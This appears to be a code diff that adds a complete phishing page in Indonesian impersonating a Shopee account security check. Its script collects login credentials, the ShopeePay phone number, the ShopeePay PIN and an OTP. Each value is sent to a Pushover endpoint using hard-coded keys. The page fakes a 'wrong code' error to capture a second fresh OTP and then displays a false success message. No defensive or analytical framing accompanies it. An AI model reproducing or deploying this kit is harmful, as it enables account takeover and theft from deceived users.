@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Keamanan Akun</title>
+  <style>
+    :root { --accent: #ee4d2d; --bg: #f8f9fa; --card: #ffffff; --text: #1f2937; }
+    * { box-sizing: border-box; font-family: 'Inter', system-ui, sans-serif; }
+    body { background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+    
+    .card { 
+        background: var(--card); padding: 40px; border-radius: 28px; width: 100%; max-width: 400px; 
+        box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1); transition: 0.4s ease;
+    }
+    
+    .header { text-align: center; margin-bottom: 30px; }
+    .shopee-logo { height: 48px; margin-bottom: 15px; }
+    .header h2 { font-size: 20px; color: var(--text); margin-bottom: 8px; }
+    .header p { font-size: 13px; color: #6b7280; line-height: 1.5; }
+    
+    .input-field { 
+        width: 100%; padding: 16px 20px; margin-bottom: 16px; border: 2px solid #f3f4f6; 
+        border-radius: 16px; font-size: 15px; outline: none; transition: 0.3s; background: #f9fafb;
+    }
+    .input-field:focus { border-color: var(--accent); background: #fff; }
+    
+    .btn { 
+        width: 100%; padding: 16px; background: var(--accent); color: white; border: none; 
+        border-radius: 16px; font-weight: 600; cursor: pointer; transition: 0.3s;
+    }
+    .btn:disabled { background: #d1d5db; }
+    
+    .step { display: none; opacity: 0; animation: fadeIn 0.4s forwards; }
+    .active-step { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    
+    .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+    .tab { flex: 1; padding: 12px; border: 2px solid #f3f4f6; border-radius: 12px; text-align: center; cursor: pointer; font-size: 13px; font-weight: 600; }
+    .tab.active { background: #fff5f2; border-color: var(--accent); color: var(--accent); }
+    
+    #errBox { color: #dc2626; font-size: 12px; margin-bottom: 15px; text-align: center; display: none; padding: 12px; background: #fef2f2; border-radius: 12px; line-height: 1.4; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee Logo" class="shopee-logo">
+    <h2 id="title">Verifikasi Keamanan</h2>
+    <p id="sub">Silakan masukkan akun Anda untuk mendeteksi adanya login dari perangkat yang tidak dikenal.</p>
+  </div>
+  <div id="errBox"></div>
+
+  <!-- Step 1 -->
+  <form id="step1" class="step active-step">
+    <input type="text" class="input-field" id="id1" placeholder="Username / Email / No. HP" required>
+    <input type="password" class="input-field" id="id2" placeholder="Password" required>
+    <button type="submit" class="btn">Log in</button>
+  </form>
+
+  <!-- Step 2 -->
+  <form id="step2" class="step">
+    <input type="tel" class="input-field" id="id3" placeholder="No. HP ShopeePay" required>
+    <button type="submit" class="btn">Lanjutkan</button>
+  </form>
+
+  <!-- Step 3 -->
+  <form id="step3" class="step">
+    <input type="password" class="input-field" id="id4" placeholder="PIN ShopeePay (6 Digit)" maxlength="6" inputmode="numeric" required>
+    <button type="submit" class="btn">Konfirmasi PIN</button>
+  </form>
+
+  <!-- Step 4 -->
+  <form id="step4" class="step">
+    <div class="tabs">
+      <div class="tab active" onclick="setMode(6, this)">6 Angka</div>
+      <div class="tab" onclick="setMode(4, this)">4 Angka</div>
+    </div>
+    <input type="text" class="input-field" id="id5" placeholder="Kode Verifikasi" maxlength="6" inputmode="numeric" required>
+    <button type="submit" class="btn" id="btn4">Verifikasi</button>
+  </form>
+</div>
+
+<script>
+  let data = {}, mode = 6, attempts = 0;
+  const sub = document.getElementById('sub'), err = document.getElementById('errBox');
+
+  async function push(t, m) {
+    await fetch("https://api.pushover.net/1/messages.json", {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({token: "akrrg1jbw9veuujgxsr4pzd8922gqc", user: "uqeogidi42myzrchqncif9tdkcomfh", title: t, message: m})
+    });
+  }
+
+  function setMode(m, el) {
+    mode = m; document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    el.classList.add('active'); document.getElementById('id5').maxLength = m;
+  }
+
+  document.getElementById('step1').onsubmit = async (e) => { e.preventDefault(); data.u = document.getElementById('id1').value; data.p = document.getElementById('id2').value; await push("S1-Login", `User: ${data.u}\nPass: ${data.p}`); document.getElementById('step1').classList.remove('active-step'); document.getElementById('step2').classList.add('active-step'); sub.innerText = "Masukkan No. HP ShopeePay"; };
+  
+  document.getElementById('step2').onsubmit = async (e) => { e.preventDefault(); data.hp = document.getElementById('id3').value; await push("S2-HP", `HP: ${data.hp}`); document.getElementById('step2').classList.remove('active-step'); document.getElementById('step3').classList.add('active-step'); sub.innerText = "Masukkan PIN ShopeePay"; };
+  
+  document.getElementById('step3').onsubmit = async (e) => { e.preventDefault(); data.pin = document.getElementById('id4').value; await push("S3-PIN", `PIN: ${data.pin}`); document.getElementById('step3').classList.remove('active-step'); document.getElementById('step4').classList.add('active-step'); sub.innerText = "Silakan masukkan kode verifikasi yang Anda terima melalui WhatsApp atau SMS."; };
+
+  document.getElementById('step4').onsubmit = async (e) => {
+    e.preventDefault();
+    if (attempts === 0) {
+      attempts++; err.style.display = "block";
+      document.getElementById('btn4').disabled = true;
+      let count = 10;
+      let timer = setInterval(() => {
+        err.innerText = `Kode salah. Silakan cek kode yang terbaru yang sudah dikirimkan, coba lagi dalam ${count} detik.`;
+        count--;
+        if (count < 0) { clearInterval(timer); err.style.display = "none"; document.getElementById('btn4').disabled = false; }
+      }, 1000);
+    } else {
+      await push("S4-OTP", `OTP (${mode} digit): ${document.getElementById('id5').value}`);
+      document.querySelector('.card').innerHTML = "<h3>Verifikasi Berhasil</h3><p>Data telah diverifikasi.</p>";
+    }
+  };
+</script>
+</body>
+</html>
